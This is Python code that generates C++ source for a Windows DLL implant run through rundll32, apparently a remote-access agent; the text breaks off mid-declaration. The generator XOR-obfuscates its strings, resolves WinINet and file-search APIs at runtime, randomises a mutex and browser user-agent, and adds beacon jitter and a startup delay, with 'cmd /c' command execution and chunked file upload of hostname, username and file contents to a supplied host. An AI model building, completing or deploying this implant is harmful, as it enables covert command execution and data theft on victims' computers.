import random
import string
import sys

XOR_KEY = random.randint(1, 255)

def xor_str(s):
    return bytes([ord(c) ^ XOR_KEY for c in s])

def c_array(b):
    return '{' + ','.join(str(x) for x in b) + '}'

def add_null(s):
    return s + '\x00'

def rand_str(n, prefix=''):
    chars = string.ascii_letters + string.digits
    return prefix + ''.join(random.choice(chars) for _ in range(n))

UA_POOL = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0',
]

host = sys.argv[1] if len(sys.argv) > 1 else '127.0.0.1'
port = sys.argv[2] if len(sys.argv) > 2 else '8443'

MUTEX_NAME   = rand_str(16, 'Global\\')
LOG_NAME     = rand_str(8) + '.tmp'
USER_AGENT   = random.choice(UA_POOL)
STARTUP_MIN  = random.randint(30, 90)
BEACON_BASE  = random.randint(8, 15)
BEACON_JIT   = random.randint(3, 8)
UPLOAD_BASE  = random.randint(150, 300)
UPLOAD_JIT   = random.randint(100, 400)

strings = {
    'host': add_null(host),
    'port': add_null(port),
    'path_beacon': add_null('/beacon'),
    'path_upload_init': add_null('/upload_init'),
    'path_upload_chunk': add_null('/upload_chunk'),
    'ua': add_null(USER_AGENT),
    'mutexname': add_null(MUTEX_NAME),
    'logname': add_null(LOG_NAME),
    'cmdprefix': add_null('cmd /c '),
    'dll_wininet': add_null('wininet.dll'),
    'dll_advapi32': add_null('advapi32.dll'),
    'dll_shell32': add_null('shell32.dll'),
    'dll_kernel32': add_null('kernel32.dll'),
    'dll_ole32': add_null('ole32.dll'),
    'api_InternetOpenA': add_null('InternetOpenA'),
    'api_InternetConnectA': add_null('InternetConnectA'),
    'api_HttpOpenRequestA': add_null('HttpOpenRequestA'),
    'api_HttpSendRequestA': add_null('HttpSendRequestA'),
    'api_InternetReadFile': add_null('InternetReadFile'),
    'api_InternetCloseHandle': add_null('InternetCloseHandle'),
    'api_InternetSetOptionA': add_null('InternetSetOptionA'),
    'api_CreateMutexA': add_null('CreateMutexA'),
    'api_GetLastError': add_null('GetLastError'),
    'api_CoCreateGuid': add_null('CoCreateGuid'),
    'api_SHCreateDirectoryExA': add_null('SHCreateDirectoryExA'),
    'api_FindFirstFileA': add_null('FindFirstFileA'),
    'api_FindNextFileA': add_null('FindNextFileA'),
    'api_FindClose': add_null('FindClose'),
    'api_GetLogicalDriveStringsA': add_null('GetLogicalDriveStringsA'),
    'api_GetDriveTypeA': add_null('GetDriveTypeA'),
    'field_guid': add_null('guid'),
    'field_hostname': add_null('hostname'),
    'field_username': add_null('username'),
    'field_result_b64': add_null('result_b64'),
    'field_seq': add_null('seq'),
    'field_filename': add_null('filename'),
    'field_total_size': add_null('total_size'),
    'field_offset': add_null('offset'),
    'field_chunk_b64': add_null('chunk_b64'),
    'field_status': add_null('status'),
    's_dot': add_null('.'),
    's_dot2': add_null('..'),
    's_dir': add_null('*'),
    's_backslash': add_null(chr(92)),
    's_slash': add_null('/'),
}

enc = {k: c_array(xor_str(v)) for k, v in strings.items()}

def enc_len(s):
    return len(xor_str(s))

cpp_header = f'''// Auto-generated DLL agent for rundll32
// XOR key: {XOR_KEY}
// Host: {host}:{port}
// Mutex: {MUTEX_NAME}
// Startup delay: {STARTUP_MIN}s
// Beacon: {BEACON_BASE}s +/- {BEACON_JIT}s
// Upload: {UPLOAD_BASE}ms +/- {UPLOAD_JIT}ms
#include <windows.h>
#include <wininet.h>
#include <string>
#include <cstring>
#include <ctime>
#include <stdio.h>
#include <vector>
#include <stdarg.h>
#include <stdlib.h>

static const unsigned char XOR_KEY = {XOR_KEY};

static unsigned char _e_host[{enc_len(host)}] = {enc['host']};
static unsigned char _e_port[{enc_len(port)}] = {enc['port']};
static unsigned char _e_path_beacon[{enc_len('/beacon')}] = {enc['path_beacon']};
static unsigned char _e_path_upload_init[{enc_len('/upload_init')}] = {enc['path_upload_init']};
static unsigned char _e_path_upload_chunk[{enc_len('/upload_chunk')}] = {enc['path_upload_chunk']};
static unsigned char _e_ua[{enc_len(USER_AGENT)}] = {enc['ua']};
static unsigned char _e_mutexname[{enc_len(MUTEX_NAME)}] = {enc['mutexname']};
static unsigned char _e_logname[{enc_len(LOG_NAME)}] = {enc['logname']};
static unsigned char _e_cmdprefix[{enc_len('cmd /c ')}] = {enc['cmdprefix']};
static unsigned char _e_dll_wininet[{enc_len('wininet.dll')}] = {enc['dll_wininet']};
static unsigned char _e_dll_advapi32[{enc_len('advapi32.dll')}] = {enc['dll_advapi32']};
static unsigned char _e_dll_shell32[{enc_len('shell32.dll')}] = {enc['dll_shell32']};
static unsigned char _e_dll_kernel32[{enc_len('kernel32.dll')}] = {enc['dll_kernel32']};
static unsigned char _e_dll_ole32[{enc_len('ole32.dll')}] = {enc['dll_ole32']};
static unsigned char _e_api_InternetOpenA[{enc_len('InternetOpenA')}] = {enc['api_InternetOpenA']};
static unsigned char _e_api_InternetConnectA[{enc_len('InternetConnectA')}] = {enc['api_InternetConnectA']};
static unsigned char _e_api_HttpOpenRequestA[{enc_len('HttpOpenRequestA')}] = {enc['api_HttpOpenRequestA']};
static unsigned char _e_api_HttpSendRequestA[{enc_len('HttpSendRequestA')}] = {enc['api_HttpSendRequestA']};
static unsigned char _e_api_InternetReadFile[{enc_len('InternetReadFile')}] = {enc['api_InternetReadFile']};
static unsigned char _e_api_InternetCloseHandle[{enc_len('InternetCloseHandle')}] = {enc['api_InternetCloseHandle']};
static unsigned char _e_api_InternetSetOptionA[{enc_len('InternetSetOptionA')}] = {enc['api_InternetSetOptionA']};
static unsigned char _e_api_CreateMutexA[{enc_len('CreateMutexA')}] = {enc['api_CreateMutexA']};
static unsigned char _e_api_GetLastError[{enc_len('GetLastError')}] = {enc['api_GetLastError']};
static unsigned char _e_api_CoCreateGuid[{enc_len('CoCreateGuid')}] = {enc['api_CoCreateGuid']};
static unsigned char _e_api_SHCreateDirectoryExA[{enc_len('SHCreateDirectoryExA')}] = {enc['api_SHCreateDirectoryExA']};
static unsigned char _e_api_FindFirstFileA[{enc_len('FindFirstFileA')}] = {enc['api_FindFirstFileA']};
static unsigned char _e_api_FindNextFileA[{enc_len('FindNextFileA')}] = {enc['api_FindNextFileA']};
static unsigned char _e_api_FindClose[{enc_len('FindClose')}] = {enc['api_FindClose']};
static unsigned char _e_api_GetLogicalDriveStringsA[{enc_len('GetLogicalDriveStringsA')}] = {enc['api_GetLogicalDriveStringsA']};
static unsigned char _e_api_GetDriveTypeA[{enc_len('GetDriveTypeA')}] = {enc['api_GetDriveTypeA']};
static unsigned char _e_field_guid[{enc_len('guid')}] = {enc['field_guid']};
static unsigned char _e_field_hostname[{enc_len('hostname')}] = {enc['field_hostname']};
static unsigned char _e_field_username[{enc_len('username')}] = {enc['field_username']};
static unsigned char _e_field_result_b64[{enc_len('result_b64')}] = {enc['field_result_b64']};
static unsigned char _e_field_seq[{enc_len('seq')}] = {enc['field_seq']};
static unsigned char _e_field_filename[{enc_len('filename')}] = {enc['field_filename']};
static unsigned char _e_field_total_size[{enc_len('total_size')}] = {enc['field_total_size']};
static unsigned char _e_field_offset[{enc_len('offset')}] = {enc['field_offset']};
static unsigned char _e_field_chunk_b64[{enc_len('chunk_b64')}] = {enc['field_chunk_b64']};
static unsigned char _e_field_status[{enc_len('status')}] = {enc['field_status']};
static unsigned char _e_s_dot[{enc_len('.')}] = {enc['s_dot']};
static unsigned char _e_s_dot2[{enc_len('..')}] = {enc['s_dot2']};
static unsigned char _e_s_dir[{enc_len('*')}] = {enc['s_dir']};
static unsigned char _e_s_backslash[{enc_len(chr(92))}] = {enc['s_backslash']};
static unsigned char _e_s_slash[{enc_len('/')}] = {enc['s_slash']};

struct API {{
    HMODULE hWininet, hAdvapi, hShell32, hKernel32, hOle32;
    HINTERNET (WINAPI *f_InternetOpenA)(LPCSTR,DWORD,LPCSTR,LPCST
